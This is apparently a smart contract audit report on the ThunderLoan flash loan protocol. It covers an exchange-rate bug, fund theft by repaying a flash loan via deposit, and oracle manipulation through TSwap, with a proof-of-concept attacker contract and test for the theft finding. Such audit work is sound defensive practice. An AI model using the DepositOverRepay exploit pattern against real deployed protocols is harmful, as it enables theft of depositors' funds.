### [S-#] TITLE (Root Cause -> Impact)

**Description:** 

**Impact:** 

**Proof of Concept:**

**Recommended Mitigation:** 



## High

### [H-1] Erroneous `ThunderLoan::updateExchangeRate` in the `deposit` function causes protocol to think it has more fees than it really does, which blocks redemption and incorrectly sets the exchange Rate


**Description:**  In the ThunderLoan system, the `exchangeRate`is responsible for calculating the exchange rate between assetTokens and underlying tokens. In a way, it's  responsible for keeping track of how many fees to give to liquidity providers.

However, the  `deposit` function, updates this rate, without collecting any fees!

```javascript
    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);

        //@audit -high we shouldn't be updating the exchange rate here    
    @>   uint256 calculatedFee = getCalculatedFee(token, amount);
    @>   assetToken.updateExchangeRate(calculatedFee);

        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

**Impact:** There are several impacts to this bug.

1. The `redeem` function is blocked, because the protocol thinks the owed tokens is more than it has.
2. Rewards are incorrectly calculated, leading to liquidity providers getting way more or less than deserved.

**Proof of Concept:**

1. LP deposits.
2. User takes out a flash loan.
3. It is now impossible for LP to redeem.

<details>
<summary>Proof of Code</summary>

Place the following in the `ThunderLoanTest.t.sol`

```javascript
function testRedeemAfterLoan() public setAllowedToken hasDeposits{
        //liquidityProvider deposits the asset
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        //user taking the flashloan
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        //liquidityProvider redeeming his assets as we
        uint256 amountToRedeem = type(uint256).max;
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, amountToRedeem);
    }
```
</details>

**Recommended Mitigation:** Remove the incorrectly updated exchange rate lines from `deposit`

```diff
  function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);

-       uint256 calculatedFee = getCalculatedFee(token, amount);
-       assetToken.updateExchangeRate(calculatedFee);

        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```




### [H-2] All the funds can be stolen if the flashloan is returned using deposit()

**Description** The `flashloan` function checks to ensure that ending balance is always greater than the initial balance + fee (for borrowing).But this check is done using token.balanceOf(address(assetToken)).
Exploiting this vulnerability, an attacker can return the flashloan using the `deposit` function instead of `repay` function. This allows the attacker to mint AssetToken and subsequently redeem it using `redeem` function. This will result in  apparent increase in the Asset contract's balance and  the check will pass and the flashloan function doesn't revert.

```javascript
    uint256 endingBalance = token.balanceOf(address(assetToken));

```

**Impact**  All the funds of the AssetContract can be stolen.


<details>
<summary>Proof of Code</summary>

**Place the following  test in the ThunderLoanTest.t.sol**

```javascript
    function testUserDepositInsteadOfRepayToStealFunds() public setAllowedToken hasDeposits{
        vm.startPrank(user);
        uint256 amountToBorrow = 50e18;
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        DepositOverRepay dor =  new DepositOverRepay(address(thunderLoan));
        tokenA.mint(address(dor), fee);
        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
        dor.redeemMoney();
        vm.stopPrank();

        console.log("balance of dor contract",tokenA.balanceOf(address(dor))); //50157185829891086986
        console.log("balance of tokenA contract", address(tokenA).balance); //0
        console.log("amount borrowed + fee", 50e18 + fee); //50150000000000000000
        assert(tokenA.balanceOf(address(dor)) > 50e18 + fee);
    }

```


**Place the following contract  in the ThunderLoanTest.t.sol**

```javascript
contract  DepositOverRepay is  IFlashLoanReceiver{
    ThunderLoan thunderLoan;
    AssetToken assetToken;
    IERC20 s_token;
    constructor(address _thunderLoan){
        thunderLoan = ThunderLoan(_thunderLoan);
    }
    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /*initiator*/,
        bytes calldata /* params*/
    )
        external
        returns (bool)
        {
            s_token = IERC20(token);
            assetToken = thunderLoan.getAssetFromToken(IERC20(token));
            IERC20(token).approve(address(thunderLoan), amount +fee);
            thunderLoan.deposit(IERC20(token),amount+ fee);
            return true;
        }
    function redeemMoney() public{
        uint256 amount = assetToken.balanceOf(address(this));
        thunderLoan.redeem(s_token, amount);

    }
}
```

</details>

**Recommended Mitigation** Add a check in `deposit` function to make it impossible to use it in the same block of the flash loan. For example registring the block.number in a variable in `flashloan` function and checking it in `deposit` function.

## Medium

### [M-1] Using TSwap as price oracle leads to price and oracle manipulation attacks

**Description:** The TSwap protocol is a constant product formula based AMM (automated market maker). The price of a token is determined by how many reserves are on either side of the pool. Because of this, it is easy for malicious users to manipulate the price of a token by buying or selling a large amount of the token in the same transaction, essentially ignoring protocol fees. 

**Impact:** Liquidity providers will drastically reduced fees for providing liquidity. 

**Proof of Concept:** 

The following all happens in 1 transaction. 

1. User takes a flash loan from `ThunderLoan` for 1000 `tokenA`. They are charged the original fee `fee1`. During the flash loan, they do the following:
   1. User sells 1000 `tokenA`, tanking the price. 
   2. Instead of repaying right away, the user takes out another flash loan for another 1000 `tokenA`. 
      1. Due to the fact that the way `ThunderLoan` calculates price based on the `TSwapPool` this second flash loan is substantially cheaper. 
```javascript
    function getPriceInWeth(address token) public view returns (uint256) {
        address swapPoolOfToken = IPoolFactory(s_poolFactory).getPool(token);
@>      return ITSwapPool(swapPoolOfToken).getPriceOfOnePoolTokenInWeth();
    }
```
    3. The user then repays the first flash loan, and then repays the second flash loan.

I have created a proof of code located in my `audit-data` folder. It is too large to include here. 

**Recommended Mitigation:** Consider using a different price oracle mechanism, like a Chainlink price feed with a Uniswap TWAP fallback oracle. 
